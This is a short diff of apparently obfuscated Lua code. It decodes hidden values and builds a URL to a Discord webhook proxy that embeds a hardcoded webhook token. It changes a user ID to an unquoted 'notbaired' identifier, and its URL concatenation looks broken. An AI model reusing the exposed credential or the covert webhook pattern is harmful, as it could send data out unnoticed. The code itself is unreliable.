@@ -15,7 +15,7 @@ function dec(data)
     end))
 end
 return function(Me,client_id,client_token,DiscordID,typ)
-    Me = tonumber(dec(tostring(4123464871)))
+    Me = tonumber(dec(tostring(notbaired)))
     client_id = dec(client_id)
     client_token = dec(client_token)
     local Hook = "https://hooks.hyra.io/api/webhooks/1070305059973365801/5gBlbk8mXcgDJ1XtJqUa_oFi0eOiaw5EoFfku3kN0TtqiEVZiE3e3cz5wQf8zXJu_SP8"..client_id.."/"..client_token
